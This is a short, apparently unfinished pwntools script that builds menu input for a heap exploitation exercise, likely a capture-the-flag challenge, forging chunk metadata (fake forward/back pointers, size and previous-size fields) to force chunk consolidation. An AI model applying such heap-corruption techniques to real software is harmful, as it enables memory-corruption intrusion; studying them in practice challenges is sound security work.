from pwn import *

def alloc(size):
    if size <= 240:
        return "1\n1\n{}\n".format(size)
    elif size >= 272 and size <= 480:
        return "1\n2\n{}\n".format(size)
    else:
        raise Exception("Invalid size {}".format(size))

def write(page, content):
    return "2\n{}\n{}\n".format(page, content)

def read(page):
    return "3\n{}\n".format(page)

def burn(page):
    return "4\n{}\n".format(page)

e = ''
sizes = 344

# Filler blocks
for i in range(7):
    e += alloc(344)

e += alloc(344)
e += alloc(344)

# "Free" block
block = ''

# Back pointer
block += p64(0xdeadbeef)
# Forward pointer
block += p64(0xcafebead)
# Data
block += 'Z'*320
# Fake previous size
block += p64(312)

e += write(7, block)

# ----- Block we want to be consolidated -----

# Padding
block = 'D'*248
# Previous size
block += p64(300)
# Fake block size
block += p64(20)

e += write(8, block)

'''
# Real block fake pointers
block = 'Z'*8
block += 'M'*8
# Real block data
block += 'A'*232
# Prev size
block += p64(0x101)
# Fake block size
block += p64(0x20)
# Fake block pointers
block += 'K'*8
block += 'F'*8
# Fake block data
block += p64(0x20)
block += p64(0x20)
e += write(i, block)
'''

# Filler burns
for i in range(7):
    e += burn(i)

e += burn(8)

print(e)
